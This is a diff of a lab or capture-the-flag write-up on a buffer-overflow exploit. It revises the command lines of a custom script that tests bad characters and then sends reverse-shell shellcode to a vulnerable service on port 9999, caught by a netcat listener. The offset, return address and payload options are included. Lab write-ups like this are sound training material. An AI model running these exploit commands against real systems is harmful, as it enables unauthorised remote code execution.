@@ -136,7 +136,7 @@ I used the first found address (0x625014df)
 
 Before sending a test shell code, I tested the application for bad chars (I already removed the null byte '00' since this usually crashes memory):
 ```
-./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --badchar=after --exclude=00
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=lBBBBBBBB --after=badchar --exclude=00 --nops=2 -v
 ```
 ![badchars](imgs/badchars.png?raw=true)
 
@@ -162,7 +162,7 @@ sudo rlwrap -a nc -lvnp 80
 
 And sent the exploit:
 ```
-./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse280 --nops=12
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --after=shellcode --shellcode=reverse280 --nops=10 -v
 ```
 ![vmshell](imgs/vmshell.png?raw=true)
 
@@ -186,7 +186,7 @@ sudo rlwrap -a nc -lvnp 80
 
 Executed the exploit:
 ```
-./ig-buffer-overflow.py -m exploit --rhost=10.10.144.220 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse980 --nops=12
+./ig-buffer-overflow.py -m write --rhost=10.10.144.220 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --after=shellcode --shellcode=reverse980 --nops=10 -v
 ```
 ![targetshell](imgs/targetshell.png?raw=true)
 
